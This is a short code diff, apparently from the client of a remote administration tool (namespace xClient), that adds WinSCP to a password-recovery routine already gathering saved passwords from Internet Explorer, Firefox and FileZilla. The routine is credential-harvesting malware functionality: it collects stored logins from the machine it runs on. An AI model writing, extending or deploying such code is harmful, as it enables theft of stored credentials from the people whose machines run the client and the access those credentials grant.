@@ -28,6 +28,7 @@ namespace xClient.Core.Commands
             recovered.AddRange(InternetExplorer.GetSavedPasswords());
             recovered.AddRange(Firefox.GetSavedPasswords());
             recovered.AddRange(FileZilla.GetSavedPasswords());
+            recovered.AddRange(WinSCP.GetSavedPasswords());
 
             List<string> raw = new List<string>();
 
